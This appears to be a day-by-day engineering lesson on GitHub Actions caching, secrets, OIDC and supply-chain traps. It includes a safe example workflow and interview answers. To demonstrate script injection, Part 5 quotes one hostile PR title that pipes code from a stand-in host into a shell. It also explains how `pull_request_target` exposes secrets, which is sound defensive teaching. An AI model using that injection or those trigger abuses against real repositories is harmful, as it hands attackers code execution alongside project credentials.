# Day 369 ⚙️

**P-369** · ⚙️ **GitHub Actions** — caching, secrets, and ⭐⭐ the supply-chain traps

**Time:** 3 hrs · **Mode:** BUILD

> ⭐⭐ **The sentence to own: a CI system is a machine that runs arbitrary third-party code with access
> to your credentials and your artefact registry — so the two things worth being precise about are
> never using a long-lived cloud key when OIDC exists, and understanding exactly which trigger gives a
> pull request from a stranger access to your secrets.**

---

# Part 1 — ⭐ The model, in four terms

```
⭐⭐ ***WORKFLOW*** — a YAML file in `.github/workflows/`,
⭐   triggered by an event.
⭐⭐ ***JOB*** — runs on one runner. ⭐⭐ JOBS ARE PARALLEL BY
⭐   DEFAULT AND ISOLATED FROM EACH OTHER — ⭐ separate
⭐   filesystems, so anything shared must go through artefacts
⭐   or a cache.
⭐⭐ ***STEP*** — a command or an action, sequential within a
⭐   job, sharing the filesystem.
⭐⭐ ***ACTION*** — reusable code from a repository.
⭐   ⭐⭐ THIS IS THE SUPPLY-CHAIN SURFACE (Part 5).

⭐⭐ THE SHAPE THAT MATTERS: ⭐⭐ ***PARALLEL JOBS FOR
⭐   INDEPENDENT WORK, `needs:` FOR REAL DEPENDENCIES ONLY.***
⭐   ⭐ Lint, type check and unit tests do not depend on each
⭐     other ⇒ ⭐⭐ THREE PARALLEL JOBS, AND THE WALL TIME IS THE
⭐     SLOWEST, NOT THE SUM.
⭐   ⭐ Build depends on tests ⇒ `needs: [test]`.
⭐   ⇒ ⭐ A common mistake is one long job "because it shares a
⭐     virtualenv" — ⭐⭐ WHICH TRADES FIVE MINUTES OF WALL TIME
⭐     FOR THIRTY SECONDS OF CACHE RESTORE.

⭐⭐ AND THE TWO SETTINGS EVERY WORKFLOW SHOULD HAVE:
⭐   ⭐ ⭐⭐ `permissions: contents: read` AT THE TOP. ⭐ The
⭐     default token is broadly scoped; ⭐⭐ NARROWING IT IS ONE
⭐     LINE AND IT IS THE HIGHEST-VALUE LINE IN THE FILE.
⭐   ⭐ ⭐⭐ `concurrency:` WITH `cancel-in-progress: true`,
⭐     GROUPED BY REF — ⭐ so pushing three times to a PR runs
⭐     one pipeline, not three. ⭐⭐ THIS ALONE OFTEN CUTS QUEUE
⭐     TIME (Day 368's fourth metric) BY HALF.
```

# Part 2 — ⭐⭐ Caching that actually hits

```
⭐⭐ THE CACHE IS KEYED, AND ***THE KEY IS THE WHOLE DESIGN.***
⭐   ⭐ ⭐⭐ EXACT KEY MATCH ⇒ RESTORE ***AND DO NOT SAVE AGAIN***.
⭐   ⭐ No exact match ⇒ try `restore-keys` prefixes ⇒ ⭐ restore
⭐     the closest, ⭐⭐ AND SAVE A NEW ENTRY AT THE END.
⭐   ⇒ ⭐⭐ SO A KEY THAT NEVER CHANGES NEVER UPDATES THE CACHE,
⭐     AND A KEY THAT ALWAYS CHANGES NEVER HITS. ⭐ Both failure
⭐     modes are common and both are silent.

⭐⭐ THE RIGHT KEY FOR PYTHON:
⭐   ⭐ `key: py-${{ runner.os }}-${{ matrix.python }}-${{
⭐     hashFiles('requirements.lock') }}`
⭐   ⇒ ⭐⭐ HASH THE ***LOCKFILE***, NOT `requirements.in` — ⭐ the
⭐     lockfile is what determines the installed bytes.
⭐   ⭐ `restore-keys: py-${{ runner.os }}-${{ matrix.python }}-`
⭐     ⇒ ⭐ a partial hit still saves most of the download when
⭐     one dependency changes.
⭐   ⭐ ⭐⭐ INCLUDE THE OS AND PYTHON VERSION, OR A MATRIX JOB
⭐     RESTORES ANOTHER VERSION'S WHEELS AND FAILS IN A WAY THAT
⭐     LOOKS INSANE.

⭐⭐ WHAT TO CACHE, AND WHAT NOT TO:
⭐   ⭐ ✔ ⭐⭐ THE ***WHEEL CACHE*** OR THE VENV — ⭐ `setup-python`
⭐     has `cache: pip` built in and it is usually enough.
⭐   ⭐ ✔ `ruff`/`mypy` caches ⇒ ⭐⭐ mypy's INCREMENTAL CACHE CAN
⭐     TURN A 90-SECOND CHECK INTO 10 SECONDS, and almost nobody
⭐     caches it.
⭐   ⭐ ✔ Docker layer cache (Part 3).
⭐   ⭐ ✘ ⭐⭐ NEVER CACHE ANYTHING SECRET, ⭐ and never cache
⭐     `~/.aws` or a token directory. ⭐⭐ CACHES ARE READABLE BY
⭐     ANY WORKFLOW IN THE REPOSITORY, ***INCLUDING ONE ADDED BY
⭐     A PULL REQUEST.***
⭐   ⭐ ✘ Test databases or generated fixtures that must be
⭐     fresh — ⭐ a stale cache here produces the worst kind of
⭐     flake.

⭐⭐ AND THE SCOPING RULE THAT EXPLAINS "WHY DOES MY PR NEVER
⭐   HIT THE CACHE?":
⭐   ⭐ ⭐⭐ A BRANCH CAN READ CACHES FROM ***ITSELF AND FROM THE
⭐     DEFAULT BRANCH***, BUT NOT FROM OTHER BRANCHES.
⭐   ⇒ ⭐⭐ SO YOU MUST POPULATE THE CACHE ON `main` (a push
⭐     workflow), OR EVERY PR STARTS COLD. ⭐ This single
⭐     misunderstanding costs teams hours a week.
```

# Part 3 — ⭐⭐ Docker builds in CI, and the layer-cache problem

```
⭐⭐ THE PROBLEM: ⭐⭐ EVERY RUNNER IS A FRESH MACHINE WITH AN
⭐   EMPTY DOCKER CACHE. ⭐ So Day 362's beautiful layer ordering
⭐   buys nothing in CI unless you import a cache.

⭐⭐ THE THREE OPTIONS:
⭐   ① ⭐ `cache-from`/`cache-to: type=gha` — ⭐ GitHub's cache
⭐      backend. ⭐ Easy, ⭐⭐ AND SUBJECT TO THE 10 GB
⭐      PER-REPOSITORY CACHE LIMIT, WHICH DOCKER LAYERS EAT
⭐      QUICKLY AND WHICH THEN EVICTS YOUR ***PYTHON*** CACHE.
⭐   ② ⭐⭐ `type=registry,mode=max` — PUSH THE CACHE TO YOUR OWN
⭐      REGISTRY. ⭐ No size limit, ⭐ shared across branches and
⭐      even across repositories. ⭐⭐ THE BEST OPTION AT ANY
⭐      SCALE, AND ONE EXTRA LINE.
⭐   ③ ⭐ A persistent self-hosted runner ⇒ ⭐ a real local cache,
⭐      ⭐⭐ AND A NEW SECURITY PROBLEM (Part 5).

⭐⭐ AND THE TWO THINGS THAT MAKE CI BUILDS SLOW ANYWAY:
⭐   ⭐ ⭐⭐ `mode=max` MATTERS: THE DEFAULT `mode=min` ONLY
⭐     EXPORTS THE ***FINAL STAGE'S*** LAYERS, SO YOUR
⭐     MULTI-STAGE BUILDER CACHE IS DISCARDED — ⭐ which is
⭐     precisely the expensive stage.
⭐   ⭐ ⭐⭐ MULTI-ARCH BUILDS (`linux/amd64,linux/arm64`) UNDER
⭐     QEMU EMULATION ARE 5–20× SLOWER. ⭐ If you need arm64,
⭐     build it on a native arm runner, not under emulation.

⭐⭐ THE MATRIX WARNING: ⭐⭐ A 3-PYTHON × 3-OS MATRIX IS ***NINE
⭐   JOBS***, NINE CACHE ENTRIES AND NINE TIMES THE MINUTES.
⭐   ⭐ Use `fail-fast: false` when you want full information,
⭐     ⭐ and a reduced matrix on PRs with the full one nightly
⭐     (Day 368's tiering).
```

# Part 4 — ⭐⭐ Secrets and OIDC

```
⭐⭐ THE OLD WAY, AND WHY IT IS INDEFENSIBLE NOW:
⭐   ⭐ `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` stored
⭐     as repository secrets.
⭐   ⇒ ⭐⭐ LONG-LIVED. ⭐ Rotation is manual and therefore does
⭐     not happen. ⭐ Anyone who can add a workflow can exfiltrate
⭐     them. ⭐ They work from anywhere on earth once leaked.

⭐⭐ ***OIDC*** — THE ANSWER, AND IT IS NOT HARD:
⭐   ⭐ GitHub mints a short-lived, signed JWT describing
⭐     ***this specific workflow run***: repository, ref,
⭐     environment, workflow, actor.
⭐   ⭐ AWS/GCP/Azure is configured to trust GitHub's issuer and
⭐     to exchange that token for temporary credentials.
⭐   ⇒ ⭐⭐ NO STANDING SECRET EXISTS ANYWHERE. ⭐ Credentials
⭐     live minutes and are scoped to one role.
⭐   ⭐ Needs `permissions: id-token: write` on the job.

⭐⭐ AND THE PART PEOPLE GET WRONG, WHICH TURNS OIDC INTO A
⭐   ***WORSE*** OUTCOME:
⭐   ⭐ ⭐⭐ THE TRUST POLICY'S `sub` CONDITION MUST PIN THE
⭐     REPOSITORY ***AND*** THE REF OR ENVIRONMENT.
⭐   ⭐ ❌ `"repo:myorg/*:*"` ⇒ ⭐⭐ ***ANY BRANCH OF ANY
⭐     REPOSITORY IN THE ORG CAN ASSUME YOUR PRODUCTION ROLE***,
⭐     which means anyone who can open a branch can deploy.
⭐   ⭐ ✔ `"repo:myorg/myrepo:ref:refs/heads/main"`, ⭐ or better
⭐     `"repo:myorg/myrepo:environment:production"` ⭐⭐ COMBINED
⭐     WITH A GITHUB ENVIRONMENT THAT REQUIRES APPROVAL.
⭐   ⇒ ⭐⭐ A WILDCARD TRUST POLICY IS WORSE THAN A STATIC KEY,
⭐     BECAUSE IT ***LOOKS*** LIKE THE SECURE OPTION.

⭐⭐ THE OTHER SECRET RULES:
⭐   ⭐ ⭐⭐ MASKING IS BEST-EFFORT: A SECRET THAT IS BASE64-ED,
⭐     JSON-ENCODED OR PRINTED CHARACTER BY CHARACTER APPEARS IN
⭐     THE LOG UNMASKED. ⭐ Never assume the mask saves you.
⭐   ⭐ ⭐⭐ SECRETS ARE ***NOT*** PASSED TO WORKFLOWS TRIGGERED BY
⭐     `pull_request` FROM A FORK. ⭐ That is a feature, and it
⭐     is why fork PRs cannot deploy.
⭐   ⭐ ⭐⭐ USE ***ENVIRONMENTS*** FOR PRODUCTION SECRETS, with
⭐     required reviewers and branch restrictions — ⭐ so a
⭐     production credential is only obtainable by a run that
⭐     a human approved.
⭐   ⭐ Prefer fetching from a secrets manager at deploy time
⭐     over storing in GitHub at all (Day 372).
```

# Part 5 — ⭐⭐ The supply-chain traps

```
⭐⭐ ***TRAP ①: `uses: some/action@v3` IS A MUTABLE TAG.***
⭐   ⭐ The author can re-point `v3` at any commit, at any time.
⭐   ⇒ ⭐⭐ YOU ARE EXECUTING ARBITRARY CODE, WITH YOUR TOKEN,
⭐     THAT CAN CHANGE WITHOUT YOU DOING ANYTHING. ⭐ This has
⭐     happened repeatedly in real incidents.
⭐   ⇒ ⭐ FIX: ⭐⭐ PIN BY FULL COMMIT SHA:
⭐     `uses: actions/checkout@8f4b7f8…`. ⭐ Ugly, correct, and
⭐     Dependabot updates them for you with a reviewable diff.

⭐⭐ ***TRAP ②: `pull_request_target`.*** ⭐⭐ THE MOST DANGEROUS
⭐   TRIGGER IN THE PRODUCT.
⭐   ⭐ It runs the workflow from the ***base*** branch ***with
⭐     full secrets***, in the context of a PR — including a PR
⭐     from a complete stranger.
⭐   ⇒ ⭐⭐ IF THAT WORKFLOW CHECKS OUT THE ***PR'S*** CODE AND
⭐     RUNS ANYTHING FROM IT — A BUILD SCRIPT, A LINTER CONFIG,
⭐     `make`, EVEN INSTALLING DEPENDENCIES FROM THE PR'S
⭐     LOCKFILE — ⭐⭐ AN ATTACKER HAS EXECUTED CODE WITH YOUR
⭐     SECRETS.
⭐   ⇒ ⭐ It exists for legitimate reasons (labelling, commenting
⭐     on fork PRs). ⭐⭐ USE IT ***ONLY*** WITHOUT CHECKING OUT
⭐     UNTRUSTED CODE, AND NEVER TO RUN A BUILD.

⭐⭐ ***TRAP ③: SCRIPT INJECTION VIA `${{ }}`.***
⭐   ⭐ `run: echo "${{ github.event.pull_request.title }}"`
⭐   ⇒ ⭐⭐ THE TITLE IS ATTACKER-CONTROLLED AND IS
⭐     ***INTERPOLATED INTO THE SHELL BEFORE IT RUNS.*** ⭐ A PR
⭐     titled `"; curl evil.sh | sh; #` executes.
⭐   ⇒ ⭐ FIX: pass through `env:` and reference `"$TITLE"` —
⭐     ⭐⭐ AN ENVIRONMENT VARIABLE IS DATA; AN INTERPOLATION IS
⭐     CODE.

⭐⭐ ***TRAP ④: OVER-SCOPED `GITHUB_TOKEN`.***
⭐   ⭐ Default permissions can include write access to contents,
⭐     packages and more.
⭐   ⇒ ⭐ Set `permissions: contents: read` at the workflow
⭐     level, ⭐ and elevate per job only where needed.

⭐⭐ ***TRAP ⑤: SELF-HOSTED RUNNERS ON PUBLIC REPOSITORIES.***
⭐   ⭐ ⭐⭐ ANY FORK PR CAN RUN CODE ON YOUR MACHINE, INSIDE
⭐     YOUR NETWORK. ⭐ And runners are not ephemeral by default,
⭐     ⭐⭐ SO ONE JOB CAN LEAVE SOMETHING BEHIND FOR THE NEXT.
⭐   ⇒ ⭐ Ephemeral runners only, ⭐ and never for public repos.

⭐⭐ AND THE UNDERLYING PRINCIPLE:
⭐   ***CI IS A PRODUCTION SYSTEM WITH PRODUCTION CREDENTIALS,
⭐      AND IT RUNS CODE FROM PEOPLE YOU HAVE NEVER MET.***
⭐   ⇒ ⭐⭐ TREAT `.github/workflows/` AS SECURITY-SENSITIVE
⭐     CODE: REQUIRE REVIEW, PIN EVERYTHING, AND SCOPE
⭐     PERMISSIONS DOWN BY DEFAULT.
```

# Part 6 — ⭐ A workflow worth copying

```yaml
name: ci
on:
  push: { branches: [main] }        # ⭐⭐ POPULATES THE CACHE
  pull_request:

permissions:
  contents: read                     # ⭐⭐ NARROW BY DEFAULT

concurrency:                         # ⭐ cancel superseded runs
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  static:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f4b7f8...      # ⭐⭐ SHA-PINNED
      - uses: actions/setup-python@6ed2c67...
        with: { python-version: "3.12", cache: pip }
      - run: pip install -r requirements-dev.lock
      - run: ruff check . && ruff format --check .
      - run: mypy app                          # ⭐ cache mypy too
      - uses: gitleaks/gitleaks-action@44c470f...   # ⭐⭐ SECONDS

  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: pw }
        options: >-
          --health-cmd "pg_isready" --health-interval 2s
          --health-retries 15                  # ⭐⭐ NOT A SLEEP
        ports: ["5432:5432"]
    steps:
      - uses: actions/checkout@8f4b7f8...
      - uses: actions/setup-python@6ed2c67...
        with: { python-version: "3.12", cache: pip }
      - run: pip install -r requirements-dev.lock
      - run: pytest -n auto --cov=app --cov-report=xml
      - run: python -m scripts.check_migration_locks   # ⭐⭐ Day 368

  build:
    needs: [static, test]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write                          # ⭐⭐ OIDC
      packages: write
    steps:
      - uses: actions/checkout@8f4b7f8...
      - uses: docker/setup-buildx-action@f95db51...
      - uses: aws-actions/configure-aws-credentials@e3dd6a4...
        with:
          role-to-assume: arn:aws:iam::123:role/ci-push
          aws-region: eu-west-1                # ⭐⭐ NO STATIC KEYS
      - uses: docker/build-push-action@2cdde99...
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=registry,ref=ghcr.io/org/app:buildcache
          cache-to: type=registry,ref=ghcr.io/org/app:buildcache,mode=max
```

```
⭐⭐ THE SIX DECISIONS:
⭐   ① ⭐⭐ `push: main` EXISTS SOLELY TO POPULATE THE CACHE PRs
⭐      WILL READ (Part 2).
⭐   ② ⭐ `permissions` narrow at the top, elevated per job.
⭐   ③ ⭐⭐ EVERY ACTION SHA-PINNED.
⭐   ④ ⭐ `concurrency` cancels superseded runs.
⭐   ⑤ ⭐⭐ SERVICE HEALTHCHECKS RATHER THAN `sleep`.
⭐   ⑥ ⭐⭐ OIDC AND `mode=max` REGISTRY CACHE.
```

# Part 7 — ⭐ Debugging and cost

```
⭐⭐ DEBUGGING, IN ORDER:
⭐   ① ⭐ `ACTIONS_STEP_DEBUG: true` as a repository secret ⇒
⭐      verbose logs.
⭐   ② ⭐⭐ `act` RUNS WORKFLOWS LOCALLY — ⭐ imperfect, and it
⭐      turns a five-minute push-and-wait loop into seconds.
⭐   ③ ⭐⭐ AN SSH-INTO-THE-RUNNER ACTION (`tmate`) FOR THE
⭐      GENUINELY BAFFLING ONES — ⭐ and remove it immediately
⭐      afterwards, ⭐⭐ BECAUSE IT IS ALSO A BACKDOOR INTO A
⭐      MACHINE HOLDING YOUR TOKENS.
⭐   ④ ⭐ Upload artefacts on failure — ⭐⭐ TEST OUTPUT,
⭐      SCREENSHOTS, LOGS. ⭐ `if: failure()`.

⭐⭐ AND THE COST DIMENSION, WHICH BECOMES REAL FAST:
⭐   ⭐ ⭐⭐ MINUTES ARE BILLED, AND MACOS RUNNERS ARE ROUGHLY
⭐     10× LINUX, WINDOWS 2×. ⭐ A macOS matrix entry you added
⭐     "for completeness" can dominate the bill.
⭐   ⭐ ⭐⭐ THE BIGGEST WASTE IS ALMOST ALWAYS ***RUNNING
⭐     EVERYTHING ON EVERY PUSH***: use `paths:` filters, ⭐ tier
⭐     the matrix, ⭐ and cancel superseded runs.
⭐   ⭐ Larger runners cost more per minute ⭐⭐ AND CAN BE
⭐     CHEAPER OVERALL IF THEY MORE THAN HALVE THE TIME — ⭐ that
⭐     is an arithmetic question, not a preference.
⭐   ⇒ ⭐⭐ AND THE HIDDEN COST THAT DWARFS THE BILL: ***ENGINEER
⭐     TIME SPENT WAITING.*** ⭐ Ten engineers × six pushes a day
⭐     × five minutes saved is five hours a day, ⭐⭐ WHICH IS
⭐     WORTH FAR MORE THAN ANY RUNNER UPGRADE COSTS.
```

## Common mistakes

| Mistake | Why it's wrong |
|---|---|
| ⭐⭐ Actions referenced by mutable tag | The author can re-point `v3` at any commit. Pin by full SHA |
| ⭐⭐ `pull_request_target` that checks out PR code | A stranger executes code with your secrets. The most dangerous trigger there is |
| ⭐⭐ `${{ }}` interpolation of user-controlled text into `run:` | A PR title can inject shell. Pass through `env:` instead |
| ⭐⭐ Long-lived cloud keys as secrets | Rotation doesn't happen, and they work from anywhere once leaked. Use OIDC |
| ⭐⭐ OIDC trust policy with a wildcard `sub` | Any branch of any repo can assume your production role — worse than a static key |
| ⭐ Default `GITHUB_TOKEN` permissions | Broadly scoped. One line narrows it |
| ⭐⭐ No cache-populating workflow on the default branch | Branches can't read each other's caches, so every PR starts cold |
| ⭐ Hashing `requirements.in` instead of the lockfile | The lockfile determines the installed bytes |
| ⭐ Omitting OS and Python version from the cache key | A matrix job restores another version's wheels and fails bizarrely |
| ⭐⭐ Caching credentials or token directories | Caches are readable by any workflow in the repo, including one added by a PR |
| ⭐ `cache-to` without `mode=max` | Only the final stage is exported; your builder cache — the expensive one — is discarded |
| ⭐ Multi-arch under QEMU | 5–20× slower. Build arm64 on a native arm runner |
| ⭐ One giant job "to share the venv" | Trades five minutes of wall time for thirty seconds of cache restore |
| ⭐⭐ Self-hosted runners on public repos | Any fork PR runs code on your machine, inside your network |
| ⭐ Trusting log masking | Base64-ed or re-encoded secrets appear unmasked |

## Interview questions

**1. "How do you authenticate CI to your cloud?"**
> ⭐⭐ OIDC, never long-lived keys. ⭐ GitHub mints a short-lived signed token describing this specific
> run — repository, ref, environment, actor — and the cloud trusts that issuer and exchanges it for
> temporary credentials, so **no standing secret exists anywhere.** ⭐⭐ And the part people get wrong:
> **the trust policy's `sub` condition must pin the repository and the ref or environment** — a
> wildcard like `repo:myorg/*:*` means any branch of any repo can assume your production role, which is
> **worse than a static key because it looks like the secure option.**

**2. "Why pin actions by SHA?"**
> ⭐ Because `@v3` is a mutable tag the author can re-point at any commit at any time — ⭐⭐ **and you are
> executing arbitrary third-party code with your token, so it can change without you doing anything.**
> ⭐ That has caused real incidents. ⭐ Full-SHA pinning is ugly and correct, and Dependabot proposes
> updates as a reviewable diff, which is exactly the property you want.

**3. "What's the most dangerous workflow trigger?"**
> ⭐⭐ `pull_request_target`. It runs the base branch's workflow **with full secrets** in the context of
> a pull request — including one from a stranger. ⭐⭐ **If that workflow checks out the PR's code and
> runs anything from it — a build script, a linter config, even installing from the PR's lockfile — an
> attacker has executed code with your secrets.** ⭐ It's legitimate for labelling and commenting on
> fork PRs, and it must never check out untrusted code or run a build.

**4. "Why does your cache never hit on pull requests?"**
> ⭐⭐ Almost certainly no cache-populating workflow on the default branch. **A branch can read caches
> from itself and from the default branch, but not from other branches** — so without a `push: main`
> workflow, every PR starts cold. ⭐ Other candidates: hashing `requirements.in` rather than the
> lockfile, or omitting OS and Python version from the key, which in a matrix restores the wrong
> version's wheels and fails in a way that looks insane.

**5. "How do you speed up Docker builds in CI?"**
> ⭐ Every runner is a fresh machine with an empty cache, ⭐⭐ so layer ordering buys nothing unless you
> import one. **Registry cache with `mode=max`** — not GitHub's cache backend, which competes with your
> Python cache for a 10 GB limit, ⭐⭐ and not the default `mode=min`, **which only exports the final
> stage and discards your multi-stage builder cache, which is the expensive one.** ⭐ And avoid
> multi-arch under QEMU; build arm64 natively.

**6. "How would you make a workflow secure by default?"**
> ⭐ Five things, all cheap. `permissions: contents: read` at the top, elevated per job. Every action
> SHA-pinned. ⭐⭐ **No user-controlled text interpolated into a `run:` block — pass it through `env:`,
> because an environment variable is data and an interpolation is code.** ⭐ Production secrets behind a
> GitHub environment with required reviewers, so a production credential is only obtainable by a run a
> human approved. ⭐ And `.github/workflows/` treated as security-sensitive code with required review —
> ⭐⭐ because **CI is a production system with production credentials that runs code from people you've
> never met.**

## 🎙️ Articulation drill

**Two minutes.** Frame CI honestly first: **it's a machine that runs arbitrary third-party code with
access to your credentials and your registry.** From that, two things matter most. First, credentials:
**OIDC rather than long-lived keys — a short-lived signed token describing this specific run, exchanged
for temporary credentials, so no standing secret exists** — and then the part people get wrong, which is
that **a wildcard `sub` condition lets any branch of any repository assume your production role, and
that's worse than a static key because it looks secure.** Second, the supply chain: **`uses: action@v3`
is a mutable tag the author can re-point at any time**, so pin by full SHA and let Dependabot propose
updates; never interpolate user-controlled text into a `run:` block, because **a PR title can inject
shell — an environment variable is data, an interpolation is code**; and treat `pull_request_target` as
radioactive, since it runs with full secrets in the context of a stranger's pull request. Then the
practical half, caching: **a branch can only read its own caches and the default branch's, so without a
`push: main` workflow every PR starts cold** — which costs teams hours a week — and Docker layers need
a registry cache with `mode=max`, because the default only exports the final stage and throws away the
builder layers you actually wanted. Close on the cost framing: **the runner bill is small next to
engineer time waiting — ten engineers, six pushes a day, five minutes saved is five hours a day.**
